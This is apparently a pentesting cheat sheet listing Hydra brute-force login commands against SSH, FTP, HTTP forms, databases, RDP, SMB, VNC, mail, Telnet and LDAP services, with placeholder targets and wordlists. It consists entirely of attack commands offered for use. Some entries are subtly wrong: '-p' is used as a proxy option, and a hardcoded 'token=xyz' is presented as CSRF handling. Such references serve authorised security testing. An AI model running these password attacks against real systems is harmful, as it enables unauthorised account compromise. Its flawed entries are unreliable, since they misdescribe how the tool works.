# [Exploitation] Brute-force SSH login --hydra
hydra -l <user> -P <password_list> ssh://<target_ip>

# [Exploitation] Brute-force SSH with multiple users --hydra
hydra -L <user_list> -P <password_list> ssh://<target_ip>

# [Exploitation] Brute-force FTP login --hydra
hydra -l <user> -P <password_list> ftp://<target_ip>

# [Exploitation] Brute-force FTP (anonymous enabled) --hydra
hydra -l anonymous -P <password_list> ftp://<target_ip>

# [Exploitation] Brute-force HTTP Basic Auth --hydra
hydra -l <user> -P <password_list> <target_ip> http-get /<path>

# [Exploitation] Brute-force HTTP Form (POST login) --hydra
hydra -l <user> -P <password_list> <target_ip> http-post-form "/<login_path>:username=^USER^&password=^PASS^:F=<fail_msg>"

# [Exploitation] Brute-force HTTP Form with CSRF token --hydra
hydra -l <user> -P <password_list> <target_ip> http-post-form "/<login_path>:username=^USER^&password=^PASS^&token=xyz:F=<fail_msg>"

# [Exploitation] Brute-force MySQL login --hydra
hydra -l <user> -P <password_list> mysql://<target_ip>

# [Exploitation] Brute-force PostgreSQL login --hydra
hydra -l <user> -P <password_list> postgres://<target_ip>

# [Exploitation] Brute-force RDP login --hydra
hydra -t 1 -V -f -l <user> -P <password_list> rdp://<target_ip>

# [Exploitation] Brute-force SMB login --hydra
hydra -l <user> -P <password_list> smb://<target_ip>

# [Exploitation] Brute-force VNC login --hydra
hydra -P <password_list> vnc://<target_ip>

# [Exploitation] Brute-force POP3 login --hydra
hydra -l <user> -P <password_list> pop3://<target_ip>

# [Exploitation] Brute-force IMAP login --hydra
hydra -l <user> -P <password_list> imap://<target_ip>

# [Exploitation] Brute-force SMTP login --hydra
hydra -l <user> -P <password_list> smtp://<target_ip>

# [Exploitation] Brute-force Telnet login --hydra
hydra -l <user> -P <password_list> telnet://<target_ip>

# [Exploitation] Brute-force LDAP login --hydra
hydra -l <user> -P <password_list> ldap2://<target_ip>

# [Exploitation] Brute-force against multiple hosts --hydra
hydra -l <user> -P <password_list> -M <targets_file> ssh

# [Exploitation] Use proxy for attack (e.g. Burp) --hydra
hydra -l <user> -P <password_list> <target_ip> http-get /<path> -o results.txt -V -e ns -vV -f -s <port> -p <proxy_ip>:<proxy_port>

# [Exploitation] Resume interrupted attack --hydra
hydra -R

# [Exploitation] Save successful attempts to a file --hydra
hydra -l <user> -P <password_list> ssh://<target_ip> -o <output_file>

# [Exploitation] Verbose mode with debug output --hydra
hydra -l <user> -P <password_list> ssh://<target_ip> -V -d

# [Exploitation] Limit number of parallel tasks (threads) --hydra
hydra -l <user> -P <password_list> ssh://<target_ip> -t <n_threads>
